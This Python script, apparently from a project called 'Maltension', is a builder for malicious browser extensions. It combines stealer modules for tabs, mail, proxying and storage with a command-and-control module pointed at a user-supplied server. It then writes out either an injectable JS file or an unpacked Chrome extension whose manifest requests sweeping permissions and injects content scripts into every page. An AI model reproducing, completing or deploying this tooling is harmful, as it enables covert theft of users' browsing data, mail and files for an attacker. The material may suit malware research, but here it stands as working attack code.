# from modules import tabs_stealer, mail_stealer, proxy_urls, storage_stealing
import argparse
import os
import sys


MODULES_DIR = 'modules'

modules_dict = {
	"cc": 'cc.js', # Always inside & First, C&C communication.
	"tabs": 'tabs.js',
	"mail": 'mail.js',
	"proxy": 'proxy.js',
	"fs": 'fs.js'
}

modules_args = {
	## For the compilation of any module place its args (vars that look like {{VAR}}).
	## KEYS INSIDE MODULE ### : ### VALUES TO REPLACE THEM WITH.  
	b'{{CC_SERVER_IP_ADDR}}': b'', # Defined by user.
	# This is here to make the following lines work:
	# let getCmds = {{CC_GET_CMDS_FN}}; let sendData = {{CC_SEND_DATA_FN}};
	b'{{CC_GET_CMDS_FN}}': b'getCmdsCC', # function name is constant, defined in cc.js
	b'{{CC_SEND_DATA_FN}}': b'sendDataCC', # function name is constant, defined in cc.js
	b'{{CC_EXECUTED_CMD_FN}}': b'executedCmdCC' # function name is constant, defined in cc.js
}

def main():
	# Verify arguments.
	parser = argparse.ArgumentParser(description='Maltension')
	parser.add_argument('-m', '--modules', dest='modules', required=True, nargs='+', 
						help='modules list to place, can be either of: {tabs, mail, proxy, fs}')
	parser.add_argument('-o', '--odir', dest='odir', default='malty',
						help='Output directory to place files.')
	parser.add_argument('-f', '--format', dest='fmt', default='js',
						help='Format of output, can be one of {js, ext},\n'
						'On default, it outputs one js file to embed.\n'
						'*If the format is "ext", ofile is required & will be used as output directory path.')
	parser.add_argument('-s', '--ccserver', dest='ccserver', default='127.0.0.1:8080',
						help='IP:PORT of the C&C server to use.')
	args = parser.parse_args()
	compile(args)


def fill_modules_args(args):
	modules_args[b'{{CC_SERVER_IP_ADDR}}'] = args.ccserver.encode('utf-8')

def get_module(mpath, args):
	d = open(os.path.join(MODULES_DIR, mpath), 'rb').read()
	print(d)
	for marg in modules_args:
		print(marg, modules_args[marg])
		d = d.replace(marg, modules_args[marg])
	return d

def compile(args):
	opath = args.odir
	# 1. Check if ouput existing.
	print(args)
	if os.path.exists(opath) or os.path.isdir(opath):
		print("[!] Error, output path %s already exists." % opath)
		return
	# 2. Generate output directory
	os.mkdir(opath)
	# 3. Create BG script filename.
	malfile_bg_name = 'background.js'
	ofile = os.path.join(opath, malfile_bg_name) # the background js file. 

	# 4. Collecting necessary modules.
	modules_list = args.modules
	mods_used = ['cc.js'] # Always add the C&C module first.
	fill_modules_args(args)
	for m in modules_list:
		if m in modules_dict:
			mods_used.append(modules_dict[m])
		else:
			print("[!] invalid module received - %s not found!" % str(m))

	# 5. JS total file generation.
	js_injected = b''
	for mu in mods_used:
		if (mu == 'cc.js'):
			js_injected += b'\n\n' + get_module(mu, args=args) + b'\n\n'
		else:
			js_injected += b'\n{\n' + get_module(mu, args=args) + b'\n};\n'
		js_injected += b'; /* Modules seperator */ ; \r\n'

	# 6. Manifest generation (if required).
	if (args.fmt == 'ext'):
		manifest_data = b'''
		{
	   "author": "Malicious GmbH",
	   "background": {
	      "persistent": true,
	      "scripts": ["%s" ]
	   },
	   // One can add in here arbitrary content scripts.
	   "content_scripts": [ {
	      "all_frames": true,
	      "js": [ "" ],
	      "match_about_blank": true,
	      "matches": [ "http://*/*", "https://*/*", "file://*/*"],
	      "run_at": "document_start"
	   }],
	   "default_locale": "en_US",
	   "description": "Maltension - Various techniques for data collection",
	   "manifest_version": 2,
	   "minimum_chrome_version": "60.0",
	   "minimum_opera_version": "47.0",
	   "name": "My Maltension!",
	   "permissions": [ "downloads" "tabs", "\u003Call_urls>", "contextMenus", "webRequest", "webRequestBlocking", "webNavigation", "storage", "unlimitedStorage", "notifications" ],
	   "short_name": "malti",
	   "update_url": "https://clients2.google.com/service/update2/crx",
	   "version": "1.33.7"
		}
		''' % (malfile_bg_name)
		manifest_path = os.path.join(opath, 'manifest.json')

	# 7. Writing it all up.
	if args.fmt == 'js':
		print("Writing \"Maltension\" JS into: " + ofile)
		open(ofile, 'wb').write(js_injected)
	elif args.fmt == 'ext':
		print("Writing an unpacked chrome-extension inside of: " + opath)
		print('Writing manifest...')
		open(manifest_path, 'wb').write(manifest_data)
		print('Done...')
		print('Writing JS...')
		open(ofile, 'wb').write(js_injected)
		print('Done All!')

main()